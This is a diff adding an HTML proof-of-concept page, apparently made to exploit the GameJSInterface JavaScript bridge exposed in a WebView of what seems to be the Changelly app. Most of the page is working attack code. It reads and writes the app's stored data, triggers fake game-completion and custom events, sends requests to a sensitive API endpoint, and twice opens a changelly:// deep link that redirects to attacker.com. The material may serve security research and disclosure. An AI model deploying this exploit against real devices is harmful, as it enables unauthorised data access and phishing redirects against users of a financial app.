@@ -1,0 +1,110 @@
+<html>
+<head>
+    <title>WebView JavaScript Interface Testing</title>
+    <style>
+        .button {
+            margin: 10px;
+            padding: 8px 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        #output {
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            min-height: 100px;
+        }
+    </style>
+</head>
+<body>
+    <h2>GameJSInterface Exploit PoC</h2>
+    
+    <h3>Data Storage/Retrieval:</h3>
+    <button class="button" onclick="getStoredData()">Get Game Instance Data</button>
+    <button class="button" onclick="setStoredData()">Set Game Instance Data</button>
+    
+    <h3>Game Control:</h3>
+    <button class="button" onclick="triggerGameComplete()">Trigger Game Complete</button>
+    <button class="button" onclick="sendCustomEvent()">Send Custom Event</button>
+    
+    <h3>System Access:</h3>
+    <button class="button" onclick="triggerVibration()">Trigger Vibration</button>
+    <button class="button" onclick="sendApiRequest()">Send API Request</button>
+    <button class="button" onclick="openCustomURL()">Open URL</button>
+    
+    <h3>Output:</h3>
+    <div id="output"></div>
+
+    <script>
+        function log(message) {
+            document.getElementById('output').innerHTML += message + '<br>';
+        }
+
+        function getStoredData() {
+            try {
+                const data = window.GameJSInterface.gameInstanceGetLocalData("test_id");
+                log("Retrieved Data: " + data);
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function setStoredData() {
+            try {
+                window.GameJSInterface.gameInstanceSetLocalData("test_id", "sensitive_data", true);
+                log("Data stored successfully");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function triggerGameComplete() {
+            try {
+                window.GameJSInterface.gameComplete("TEST", "malicious_payload", "changelly://changelly.com/webview?link=https://attacker.com");
+                log("Game complete triggered with malicious payload");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function sendCustomEvent() {
+            try {
+                window.GameJSInterface.event("custom_event", "{\"type\":\"malicious\",\"payload\":\"test\"}");
+                log("Custom event sent");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function triggerVibration() {
+            try {
+                window.GameJSInterface.vibrate([1000, 1000, 1000]);
+                log("Vibration triggered");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function sendApiRequest() {
+            try {
+                window.GameJSInterface.sendApiRequest("{\"endpoint\":\"/api/sensitive\",\"method\":\"GET\"}");
+                log("API request sent");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+
+        function openCustomURL() {
+            try {
+                window.GameJSInterface.openUrl("changelly://changelly.com/webview?link=https://attacker.com");
+                log("URL opened");
+            } catch(e) {
+                log("Error: " + e);
+            }
+        }
+    </script>
+</body>
+</html>
